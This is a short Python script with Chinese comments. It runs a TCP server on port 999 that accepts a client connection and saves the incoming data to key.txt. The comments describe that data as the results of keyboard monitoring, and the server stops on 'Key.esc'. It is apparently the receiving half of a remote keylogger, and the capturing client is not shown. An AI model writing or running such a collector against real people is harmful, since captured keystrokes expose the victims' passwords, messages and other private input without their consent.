import socket

HOST=''#任意ip都可连接
PORT=999#指定端口
ADDR=(HOST,PORT)#组成元组
tcpSerscok=socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM)#设置套接字，ipv4，tcp连接
tcpSerscok.bind(ADDR)
tcpSerscok.listen(5)#开始监听，同时监听5个请求包

while True:
    print("waiting for connection...")
    tcpClisock,addr=tcpSerscok.accept()#等待连接，死循环
    print(f"...connected from :{addr}")
    fp=open('key.txt','w',encoding='utf-8')#打开文件，准备存入接受到的键盘监听结果
    while True:
        data=tcpClisock.recv(1024).decode('utf-8')#接受监听信息，大小为1024
        print(f'{data}:push')#打印监听结果
        fp.write(data)#存入监听结果
        if data=='Key.esc':#如果客户端按到esc，停止监听
            break#退出监听
    tcpClisock.close()#关闭连接
    break#退出循环




